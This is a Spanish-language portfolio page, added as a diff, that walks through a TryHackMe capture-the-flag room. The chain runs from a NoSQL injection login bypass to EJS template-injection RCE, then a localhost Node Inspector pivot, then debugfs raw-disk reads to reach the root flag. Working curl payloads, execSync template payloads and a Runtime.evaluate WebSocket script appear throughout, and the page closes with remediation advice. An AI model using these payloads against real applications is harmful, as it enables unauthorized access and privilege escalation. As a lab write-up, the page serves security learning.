@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Byte Lotus Poolside — de NoSQLi a root vía Node Inspector · Portfolio</title>
+<meta name="post:titulo" content="Byte Lotus Poolside — de NoSQLi a root vía Node Inspector">
+<meta name="post:fecha" content="2026-08-03">
+<meta name="post:resumen" content="Login vulnerable a NoSQL injection que permite autenticarse sin contraseña, acceso a un panel de staff con SSTI en plantillas EJS para lograr RCE, y pivote a un segundo proceso vía el Node Inspector expuesto en localhost hasta leer /root/root.txt en crudo con debugfs.">
+<meta name="post:tags" content="NoSQLi, SSTI, Node.js, Node Inspector, debugfs">
+<meta name="post:plataforma" content="TryHackMe">
+<meta name="post:os" content="Linux">
+<meta name="description" content="Writeup de Salvador Navarro.">
+<meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex, noai, noimageai">
+<meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../css/style.css">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'%3E%3Crect width='64' height='64' rx='12' fill='%23050b17'/%3E%3Ctext x='32' y='47' font-size='44' font-family='monospace' font-weight='bold' text-anchor='middle' fill='%237a8f3a'%3ES%3C/text%3E%3C/svg%3E">
+</head>
+<body>
+
+<header>
+  <a class="logo" href="../index.html">PortFolio</a>
+  <nav>
+    <a href="../index.html">Inicio</a>
+    <div class="dd">
+      <a href="#" class="dd-t">Categorías ▾</a>
+      <div class="dd-m">
+        <a href="../index.html?tipo=Reto">Retos</a>
+        <a href="../index.html?tipo=Proyecto">Proyectos</a>
+        <a href="../index.html?tipo=Estudio">Estudios</a>
+      </div>
+    </div>
+    <a href="../sobremi/sobremi.html">Sobre mí</a>
+  </nav>
+</header>
+
+<main class="reto">
+  <a class="volver" href="../index.html#posts">← Volver a los posts</a>
+
+  <h1>Byte Lotus Poolside — de NoSQLi a root vía Node Inspector</h1>
+  <div class="ficha">
+    <span><strong>Fecha:</strong> 3 ago 2026</span>
+    <span><strong>Categoría:</strong> Explotación web / Pivoting</span>
+    <span><strong>Sistema:</strong> Linux</span>
+    <span><strong>Plataforma:</strong> TryHackMe (HackerHolidays · Byte Lotus · Día 7)</span>
+  </div>
+
+  <h2>Resumen</h2>
+  <p>"Byte Lotus Poolside" gestiona reservas de cabañas y tumbonas. Su login es vulnerable a inyección NoSQL, lo
+  que permite autenticarse como el usuario <code>attendant</code> sin conocer su contraseña. Con esa sesión se
+  accede a un panel de staff que renderiza plantillas EJS controladas por el usuario (SSTI → RCE) como
+  <code>poolside</code>. Desde ahí, un depurador de Node.js expuesto en <code>localhost:9229</code> permite
+  pivotar a un segundo proceso que corre como <code>pipelinesvc</code>, miembro del grupo <code>disk</code> — lo
+  que permite leer el disco en crudo con <code>debugfs</code>, saltándose los permisos del sistema de archivos,
+  y llegar a <code>/root/root.txt</code>.</p>
+
+  <h2>Escenario</h2>
+  <p>El enunciado narrativo venía cargado de pistas técnicas: una sesión que "se queda caliente en una tumbona y
+  un desconocido se sienta en ella" apuntaba directamente a robo y reutilización de cookie; una "shell en la
+  playa que responde" confirmaba que en algún punto se lograba RCE real; y la instrucción de "seguir sus pasos y
+  escalar por donde él escaló" marcaba el objetivo final: reconstruir la cadena completa de explotación hasta
+  root.</p>
+
+  <h2>Artefactos y herramientas</h2>
+  <ul>
+    <li><code>gobuster</code> — enumeración de rutas</li>
+    <li><code>curl</code> — envío manual de peticiones JSON y reutilización de cookies</li>
+    <li>DevTools del navegador — inyección manual de la cookie de sesión</li>
+    <li>Chrome DevTools Protocol (CDP) / <code>Runtime.evaluate</code> vía WebSocket — control del Node Inspector</li>
+    <li><code>debugfs</code> (e2fsprogs) — lectura cruda del dispositivo de bloque</li>
+  </ul>
+
+  <h2>Análisis</h2>
+
+  <h3>1. Reconocimiento inicial</h3>
+  <div class="pregunta"><b>Objetivo:</b> identificar la tecnología de base y las rutas disponibles.</div>
+  <p>El login es un formulario simple de "Staff / Guest ID" + "Passphrase" que envía un <code>POST /login</code>.
+  Una enumeración de rutas revela <code>/staff</code> devolviendo 403 ("Staff access only"), y las cabeceras de
+  cualquier respuesta confirman <code>X-Powered-By: Express</code>, es decir, Node.js + Express. Esto descarta de
+  entrada los payloads clásicos de SQL injection, ya que en este stack la base de datos suele ser NoSQL (NeDB,
+  MongoDB).</p>
+  <pre><code>gobuster dir -u http://&lt;TARGET_IP&gt; -w /usr/share/wordlists/dirb/common.txt -x php,py,txt,html,json
+
+/logout (Status: 302) [--> /]
+/staff  (Status: 403) [Size: 1547]</code></pre>
+  <figure>
+    <img src="img/poolside_1.webp" alt="Petición curl con bypass NoSQL y respuesta del servidor">
+    <figcaption>Respuesta HTTP 200 con el bypass de login.</figcaption>
+  </figure>
+
+  <h3>2. NoSQL injection: bypass del login</h3>
+  <div class="pregunta"><b>Objetivo:</b> autenticarse como <code>attendant</code> sin conocer su contraseña.</div>
+  <p>Las bases de datos NoSQL orientadas a documentos construyen las consultas como objetos JSON, no como texto.
+  Si la aplicación acepta JSON arbitrario en el body, un atacante puede inyectar operadores especiales en vez de
+  un valor simple. Aquí, el operador <code>$ne</code> ("distinto de") convierte la condición de contraseña en
+  "distinta de null", lo que siempre es cierto. El formulario HTML normal no permite enviar esta estructura, así
+  que la petición se construye manualmente con <code>Content-Type: application/json</code>:</p>
+  <pre><code>curl -i -s -X POST \
+  -H "Content-Type: application/json" \
+  -d '{"username":"attendant","password":{"$ne": null}}' \
+  http://&lt;TARGET_IP&gt;/login</code></pre>
+  <p>La respuesta es <code>{"ok":true,"role":"staff"}</code> junto con una cookie <code>connect.sid</code> nueva
+  en <code>Set-Cookie</code>. El código fuente, recuperado más adelante vía RCE, confirma la causa raíz: la ruta
+  de login ejecuta <code>db.findOneAsync({ username, password })</code> pasando directamente el objeto recibido
+  del cliente a la consulta de NeDB, sin validar que <code>password</code> sea un string.</p>
+  <p class="respuesta"><b>Resultado:</b> sesión válida de <code>attendant</code> obtenida sin contraseña real.</p>
+
+  <h3>3. Session hijacking y acceso al panel de staff</h3>
+  <div class="pregunta"><b>Objetivo:</b> reutilizar la cookie obtenida para acceder a <code>/staff</code>.</div>
+  <p>La cookie <code>connect.sid</code> es, en la práctica, una contraseña temporal: quien la posea es tratado
+  como esa sesión por el servidor. Se inyecta manualmente en el navegador (DevTools → Storage → Cookies) o se
+  adjunta en peticiones con <code>curl -b</code>.</p>
+  <figure>
+    <img src="img/poolside_2.webp" alt="Cookie connect.sid añadida manualmente en DevTools">
+    <figcaption>Cookie robada añadida en Storage → Cookies, asociada al dominio objetivo.</figcaption>
+  </figure>
+  <p>Recargando <code>/staff</code> con esa cookie activa, el servidor la reconoce como una sesión válida de
+  <code>attendant</code> con rol <code>staff</code> y concede acceso al panel "Cabana Desk", que incluye un campo
+  de plantilla EJS editable para personalizar mensajes de confirmación a huéspedes.</p>
+  <figure>
+    <img src="img/poolside_3.webp" alt="Panel de staff Cabana Desk con campo de plantilla EJS">
+    <figcaption>Panel de staff accesible con la sesión robada.</figcaption>
+  </figure>
+
+  <h3>4. SSTI en EJS → RCE como poolside</h3>
+  <div class="pregunta"><b>Objetivo:</b> conseguir ejecución de comandos a partir del campo de plantilla.</div>
+  <p>EJS permite mezclar HTML con JavaScript real dentro de <code>&lt;%= ... %&gt;</code>. El panel pasa el
+  contenido completo de <code>req.body.template</code> —lo que escribe el usuario— directamente a
+  <code>ejs.render()</code>, sin tratarlo solo como datos. Como ese JavaScript corre en el mismo proceso Node.js
+  del servidor, cualquier código insertado ahí se ejecuta con los privilegios del servidor, incluyendo el módulo
+  <code>child_process</code>. Se usa <code>process.mainModule.require(...)</code> en vez de <code>require(...)</code>
+  directo porque en el contexto de la plantilla compilada esa variable local no siempre está disponible, mientras
+  que <code>process.mainModule</code> sí permite recuperar de forma fiable el <code>require</code> real del
+  proceso.</p>
+  <pre><code>&lt;%= process.mainModule.require('child_process').execSync('id').toString() %&gt;</code></pre>
+  <pre><code>curl -i -s -b "connect.sid=&lt;cookie&gt;" \
+  -X POST http://&lt;TARGET_IP&gt;/staff/preview \
+  --data-urlencode "template=&lt;%= process.mainModule.require('child_process').execSync('id').toString() %&gt;"</code></pre>
+  <p>La respuesta confirma ejecución de comandos como <code>poolside</code>: <code>uid=996(poolside)
+  gid=996(poolside)</code>. Listando <code>/home</code> se confirma además la existencia de los usuarios
+  <code>pipelinesvc</code> y <code>poolside</code>, ambos relevantes en la escalada posterior.</p>
+  <figure>
+    <img src="img/poolside_4.webp" alt="Listado de /home mostrando los usuarios pipelinesvc y poolside">
+    <figcaption>Listado de /home vía RCE.</figcaption>
+  </figure>
+  <pre><code>&lt;%= process.mainModule.require('child_process').execSync('cat /home/poolside/user.txt').toString() %&gt;</code></pre>
+  <figure>
+    <img src="img/poolside_5.webp" alt="User flag renderizada en el preview de la plantilla EJS">
+    <figcaption>User flag renderizada directamente en el preview.</figcaption>
+  </figure>
+  <p class="respuesta"><b>User flag:</b> <code>THM{w4rm_s3ss10n_h1j4ck3d}</code></p>
+
+  <h3>5. Pivote a pipelinesvc vía Node Inspector</h3>
+  <div class="pregunta"><b>Objetivo:</b> escalar de <code>poolside</code> a un segundo proceso con más privilegios.</div>
+  <p>Node.js incluye un modo de depuración remota (<code>--inspect</code>), que abre un servidor en el puerto
+  <code>9229</code> implementando el Chrome DevTools Protocol (CDP). Quien pueda conectarse a ese puerto obtiene
+  control total sobre el proceso depurado, incluyendo ejecución arbitraria vía <code>Runtime.evaluate</code>. En
+  este reto el inspector de un segundo servicio (<code>processor.js</code>, corriendo como
+  <code>pipelinesvc</code>) estaba correctamente limitado a <code>localhost</code>, pero eso no protege nada
+  cuando el atacante ya tiene RCE en la misma máquina.</p>
+  <pre><code>&lt;%= process.mainModule.require('child_process').execSync('curl -s http://127.0.0.1:9229/json/list').toString() %&gt;</code></pre>
+  <figure>
+    <img src="img/poolside_6.webp" alt="JSON del inspector mostrando processor.js y su webSocketDebuggerUrl">
+    <figcaption>El inspector revela el proceso processor.js y su webSocketDebuggerUrl.</figcaption>
+  </figure>
+  <p>El JSON devuelto incluye un <code>webSocketDebuggerUrl</code>, la dirección a la que conectarse por
+  WebSocket para hablar CDP con ese proceso. Tras confirmar que el WebSocket es alcanzable, se envía
+  <code>Runtime.evaluate</code> con la expresión a ejecutar:</p>
+  <pre><code>node -e "const ws=new WebSocket('ws://127.0.0.1:9229/&lt;id&gt;');
+ws.onopen=function(){
+  ws.send(JSON.stringify({
+    id:1,
+    method:'Runtime.evaluate',
+    params:{ expression:\"process.mainModule.require('child_process').execSync('id').toString()\" }
+  }))
+};
+ws.onmessage=function(m){ console.log(m.data); process.exit() };"</code></pre>
+  <p class="respuesta"><b>Resultado:</b> <code>uid=995(pipelinesvc) gid=995(pipelinesvc)
+  groups=995(pipelinesvc),6(disk)</code> — el dato crítico es la pertenencia al grupo <code>disk</code>.</p>
+
+  <h3>6. Escalada final: grupo disk + debugfs → root flag</h3>
+  <div class="pregunta"><b>Objetivo:</b> aprovechar el grupo <code>disk</code> para leer <code>/root/root.txt</code> sin shell de root.</div>
+  <p>Los dispositivos de bloque (p. ej. <code>/dev/nvme0n1p1</code>) tienen sus propios permisos, normalmente
+  restringidos a root y al grupo <code>disk</code>. Leer el dispositivo directamente permite acceder al sistema
+  de archivos byte a byte, al margen de los permisos que ese mismo sistema de archivos impone a nivel de
+  directorios y archivos. <code>debugfs</code> (de <code>e2fsprogs</code>) interpreta esa estructura interna sin
+  pasar por el kernel VFS ni por los permisos normales.</p>
+  <pre><code>which debugfs
+&gt; /usr/sbin/debugfs
+
+lsblk -f
+&gt; nvme0n1p1 ext4 cloudimg-rootfs /</code></pre>
+  <pre><code>echo ls /root | debugfs /dev/nvme0n1p1
+&gt; debugfs: ls /root
+&gt; ... 624 (3936) root.txt
+
+echo cat /root/root.txt | debugfs /dev/nvme0n1p1
+&gt; debugfs: cat /root/root.txt
+&gt; THM{r4w_d1sk_4cc3ss_w4s_t00_much}</code></pre>
+  <figure>
+    <img src="img/poolside_7.webp" alt="Root flag extraída vía debugfs en el preview de la plantilla EJS">
+    <figcaption>Root flag extraída vía debugfs, sin haber obtenido nunca una shell de root.</figcaption>
+  </figure>
+  <p class="respuesta"><b>Root flag:</b> <code>THM{r4w_d1sk_4cc3ss_w4s_t00_much}</code></p>
+
+  <h2>Cadena de ataque (kill chain)</h2>
+  <table>
+    <tr><th>#</th><th>Paso</th></tr>
+    <tr><td>1</td><td>Reconocimiento: Express/Node identificado por cabeceras; /staff existe pero devuelve 403</td></tr>
+    <tr><td>2</td><td>NoSQL injection: login con <code>{"password":{"$ne":null}}</code> vía JSON, bypass como attendant</td></tr>
+    <tr><td>3</td><td>Session hijacking: reutilización directa de la cookie connect.sid obtenida del bypass</td></tr>
+    <tr><td>4</td><td>Acceso privilegiado: panel de staff (/staff) accesible con la sesión robada</td></tr>
+    <tr><td>5</td><td>SSTI: plantilla EJS de /staff/preview acepta contenido de plantilla no confiable</td></tr>
+    <tr><td>6</td><td>RCE inicial como poolside vía child_process.execSync</td></tr>
+    <tr><td>7</td><td>User flag recuperada de /home/poolside/user.txt</td></tr>
+    <tr><td>8</td><td>Descubrimiento: Node Inspector activo en 127.0.0.1:9229 para un segundo proceso (processor.js)</td></tr>
+    <tr><td>9</td><td>Pivote: WebSocket al inspector + Runtime.evaluate → RCE como pipelinesvc</td></tr>
+    <tr><td>10</td><td>Hallazgo crítico: pipelinesvc pertenece al grupo disk</td></tr>
+    <tr><td>11</td><td>Escalada final: lectura raw del dispositivo de bloque con debugfs</td></tr>
+    <tr><td>12</td><td>Root flag recuperada de /root/root.txt sin shell de root real</td></tr>
+  </table>
+
+  <h2>Indicadores / artefactos clave</h2>
+  <ul>
+    <li><strong>Archivo:</strong> <code>app.js</code> — contiene el <code>db.findOneAsync({ username, password })</code> vulnerable y el <code>ejs.render(template, ...)</code> con plantilla controlada por el usuario</li>
+    <li><strong>Archivo:</strong> <code>/opt/pipelinesvc/telemetry/processor.js</code> — segundo proceso con inspector expuesto en localhost:9229</li>
+    <li><strong>Dispositivo:</strong> <code>/dev/nvme0n1p1</code> (ext4, partición raíz) leído con debugfs</li>
+  </ul>
+
+  <h2>Conclusiones</h2>
+  <p>La cadena completa combina un fallo de validación de tipos en una consulta NoSQL, una plantilla server-side
+  sin separar código de datos, un servicio de depuración expuesto incluso en localhost y un exceso de privilegio
+  a nivel de grupo del sistema. Ninguno de los pasos individuales requiere romper criptografía ni fuerza bruta:
+  todo el acceso a root se consigue abusando de configuraciones y diseños inseguros. Las medidas de remediación
+  clave serían validar tipos antes de las consultas a la base de datos, no renderizar nunca plantillas cuyo
+  contenido provenga del usuario, no exponer el inspector de Node.js en producción, aplicar mínimo privilegio en
+  los grupos del sistema (ningún servicio debería pertenecer a <code>disk</code>, <code>sudo</code> o
+  <code>docker</code> sin necesidad justificada) y reforzar las cookies de sesión con <code>HttpOnly</code>,
+  <code>Secure</code> y <code>SameSite=Strict</code>, regenerando el identificador tras cada cambio de
+  privilegio.</p>
+</main>
+
+<footer>© <span id="year"></span> Salvador Navarro · Portfolio · Writeups · Proyectos</footer>
+<script>document.getElementById("year").textContent = new Date().getFullYear();</script>
+</body>
+</html>
